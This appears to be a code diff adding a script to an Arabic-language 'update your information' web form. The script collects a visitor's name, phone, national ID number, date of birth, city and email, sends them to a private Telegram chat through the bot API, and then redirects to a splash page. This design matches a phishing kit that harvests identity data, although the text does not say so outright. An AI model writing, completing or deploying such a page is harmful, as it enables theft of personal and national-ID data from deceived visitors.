@@ -14,8 +14,12 @@ html,body{height:100%;margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;
 .container{max-width:720px;margin:0 auto;padding:20px 16px 100px;box-sizing:border-box}
 h2{text-align:center;margin:18px 0;font-size:20px}
 label{display:block;margin:12px 0 6px;font-size:15px}
+label[for="phone"]{text-align:right} 
 .input-row{display:flex;gap:12px;flex-wrap:wrap}
-input[type="text"],input[type="tel"],input[type="email"],input[type="date"]{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box}
+input[type="text"],input[type="tel"],input[type="email"],input[type="date"],select{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box} 
+/* تحسين مظهر select ليتناسب مع الحقول */
+select{appearance:none;-webkit-appearance:none;background-image:linear-gradient(45deg, transparent 50%, #999 50%), linear-gradient(135deg, #999 50%, transparent 50%);background-position: calc(100% - 18px) calc(1em + 2px), calc(100% - 13px) calc(1em + 2px);background-size: 6px 6px, 6px 6px;background-repeat: no-repeat;padding-right:36px}
+
 /* زر ثابت في الأسفل مع مساحة داخلية للصفحة */
 .btn{width:calc(100% - 32px);max-width:720px;padding:14px;border:none;border-radius:10px;background:var(--accent);color:#fff;font-size:18px;position:fixed;left:50%;transform:translateX(-50%);bottom:18px;cursor:not-allowed;box-shadow:0 12px 30px rgba(0,0,0,0.12)}
 .btn.active{cursor:pointer;background:#e44a00}
@@ -100,5 +104,94 @@ input[type="text"],input[type="tel"],input[type="email"],input[type="date"]{widt
 
 <!-- تحميل Google Places API (استبدل YOUR_GOOGLE_API_KEY بمفتاحك) -->
 
+<script>
+// DOM
+const form = document.getElementById('infoForm');
+const btn = document.getElementById('submitBtn');
+const nameInput = document.getElementById('name');
+const phoneInput = document.getElementById('phone');
+const nationalId = document.getElementById('nationalId');
+const dob = document.getElementById('dob');
+const citySelect = document.getElementById('city');
+const emailInput = document.getElementById('email');
+
+// ضبط حد التاريخ: يجب أن يكون المستخدم 18 سنة على الأقل
+(function setDobLimits(){
+  const today = new Date();
+  const maxYear = today.getFullYear() - 18;
+  const maxDate = new Date(today);
+  maxDate.setFullYear(maxYear);
+  const minDate = new Date(today);
+  minDate.setFullYear(maxYear - 82);
+  function toYMD(d){ return d.getFullYear() + '-' + String(d.getMonth()+1).padStart(2,'0') + '-' + String(d.getDate()).padStart(2,'0'); }
+  dob.max = toYMD(maxDate);
+  dob.min = toYMD(minDate);
+})();
+
+// تحديث حالة الزر
+function updateButtonState(){
+  const nameOk = !!nameInput.value.trim();
+  const phoneOk = !!phoneInput.value.trim();
+  const nationalOk = !!nationalId.value.trim();
+  const cityOk = !!citySelect.value.trim();
+  const emailOk = !!emailInput.value.trim();
+  const dobOk = !!dob.value && new Date(dob.value) <= new Date(dob.max);
+  const all = nameOk && phoneOk && nationalOk && cityOk && emailOk && dobOk;
+  if(all){ btn.classList.add('active'); btn.removeAttribute('disabled'); btn.style.cursor='pointer'; }
+  else{ btn.classList.remove('active'); btn.setAttribute('disabled', true); btn.style.cursor='not-allowed'; }
+}
+[nameInput,phoneInput,nationalId,citySelect,emailInput,dob].forEach(el=>el.addEventListener('input', updateButtonState));
+
+// جعل الرقم الوطني أرقام فقط (مع دعم اللصق)
+nationalId.addEventListener('keydown', (e) => { const allowed = ['Backspace','Delete','ArrowLeft','ArrowRight','Tab']; if (allowed.includes(e.key)) return; if (e.key.length===1 && !/^[0-9]$/.test(e.key)) e.preventDefault(); });
+nationalId.addEventListener('input', ()=>{ nationalId.value = nationalId.value.replace(/[^0-9]/g,'').slice(0,nationalId.maxLength); updateButtonState(); });
+
+// عند الإرسال تحقق من العمر ثم أرسل إلى تلجرام ثم إعادة التوجيه
+const BOT_TOKEN = 'ضع_توكن_البوت_هنا';
+const CHAT_ID = 'ضع_ChatID_هنا';
+form.addEventListener('submit', function(e){
+  e.preventDefault();
+  if(btn.disabled) return;
+  // تحقق العمر
+  const dobVal = dob.value;
+  if(!dobVal){ alert('يرجى اختيار تاريخ الميلاد'); return; }
+  if(new Date(dobVal) > new Date(dob.max)){ alert('يجب أن يكون العمر 18 سنة على الأقل'); return; }
+
+  const data = {
+    name: nameInput.value.trim(),
+    phone: phoneInput.value.trim(),
+    nationalId: nationalId.value.trim(),
+    dob: dob.value.split('-').join('/'), // YYYY/MM/DD
+    city: citySelect.value.trim(),
+    email: emailInput.value.trim()
+  };
+  const text = `📋 تحديث المعلومات:
+👤 الاسم: ${data.name}
+📞 الهاتف: ${data.phone}
+🆔 الرقم الوطني: ${data.nationalId}
+🎂 تاريخ الميلاد: ${data.dob}
+🏙️ المدينة: ${data.city}
+📧 البريد الإلكتروني: ${data.email}`;
+  if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_توكن') || !CHAT_ID || CHAT_ID.includes('ضع_ChatID')){
+    alert('تنبيه: لم تقم بإضافة بيانات بوت التلجرام في الكود. سيتم عرض النتيجة محليًا.');
+    console.log('payload ->', text);
+    window.location.href = 'splash1.html';
+    return;
+  }
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ chat_id: CHAT_ID, text })
+  })
+  .then(res => res.json())
+  .then(resp => {
+    if(resp && resp.ok){ window.location.href = 'splash1.html'; }
+    else{ alert('حدث خطأ في إرسال البيانات إلى تلجرام.'); console.error('telegram response', resp); }
+  })
+  .catch(err => { alert('حدث خطأ في الإرسال'); console.error(err); });
+});
+
+// initial
+updateButtonState();
+</script>
 </body>
 </html>
